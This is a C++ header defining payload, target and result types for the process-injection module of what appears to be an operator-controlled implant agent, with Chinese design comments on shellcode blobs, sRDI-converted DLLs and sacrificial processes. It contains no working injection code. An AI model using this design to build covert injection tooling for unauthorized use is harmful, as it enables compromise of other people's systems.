/**
 * @file InjectionTypes.hpp
 * @brief 注入子系统通用类型(载荷/目标/结果契约; 远程命令驱动的注入器)
 * @details
 * **笨 Agent 原则**: 本子系统只做「声明校验 + 注入 + 回执」, 目标与载荷的选择归操作员。
 * 载荷细分(shellcode / shc 化 DLL / 裸 PE)是操作员侧账目 —— blob 形态 = 第 0 字节即入口
 * (仓库硬约定, MigrateSpawn 同款); 裸 PE 要进目标先在操作员侧转 shc(Tools/ShellcodeLoader
 * /tools/dll2shc.py, sRDI 同构产物)。Agent 只认**声明**: params 声明与方法支持面不符 =
 * 明确拒绝, 不做字节嗅探 —— 声明 blob 却发裸 PE 是操作员的事, 炸的是目标进程。
 */
#pragma once

#include <string>
#include <vector>

namespace cleat {
namespace injection {

    /// 载荷形态(操作员在 params.payload_kind 里声明; 各方法声明自己的支持面)
    enum class PayloadKind {
        Unknown = 0,
        Blob,       ///< shellcode / shc 化 DLL([boot][loader][PE], 第 0 字节 = 入口)
        NativeDll,  ///< 裸 PE DLL(v1 无方法支持 = 声明它必被拒; 反射加载器 v2 再放开)
    };

    inline const char* ToString(PayloadKind k) {
        switch (k) {
        case PayloadKind::Blob:      return "blob";
        case PayloadKind::NativeDll: return "native_dll";
        default:                     return "unknown";
        }
    }

    /// 解析失败 = Unknown(调用方拒绝), 不猜
    inline PayloadKind ParsePayloadKind(const std::string& s) {
        if (s == "blob") return PayloadKind::Blob;
        if (s == "native_dll") return PayloadKind::NativeDll;
        return PayloadKind::Unknown;
    }

    /// 目标形态(操作员决定打谁; Agent 不做进程名解析这类"决策" —— 同名选谁本就是判断)
    enum class TargetKind {
        Unknown = 0,
        Spawn,   ///< 自建牺牲进程(target = 牺牲进程镜像完整路径; 安全默认, 失败可清尸)
        Pid,     ///< 打已有进程(target = PID; attach 语义, 失败不清尸)
    };

    inline const char* ToString(TargetKind k) {
        switch (k) {
        case TargetKind::Spawn: return "spawn";
        case TargetKind::Pid:   return "pid";
        default:                return "unknown";
        }
    }

    inline TargetKind ParseTargetKind(const std::string& s) {
        if (s == "spawn") return TargetKind::Spawn;
        if (s == "pid") return TargetKind::Pid;
        return TargetKind::Unknown;
    }

    struct InjectionTarget {
        TargetKind kind = TargetKind::Unknown;
        std::string image;        ///< Spawn: 牺牲进程镜像完整路径(Win32 路径, NT 前缀由手法内部处理)
        unsigned long pid = 0;    ///< Pid
    };

    /// 字段口径与 native::InjectResult 一致(ok/pid/error/failed_at), handler 转 0x 码回执
    struct InjectionResult {
        bool ok = false;
        unsigned long pid = 0;          ///< 成功: 牺牲进程/目标 PID
        std::string error;              ///< 失败原因(可读)
        unsigned long failed_at = 0;    ///< 失败环节的原始 NTSTATUS/Win32 码(诊断)
    };

} // namespace injection
} // namespace cleat
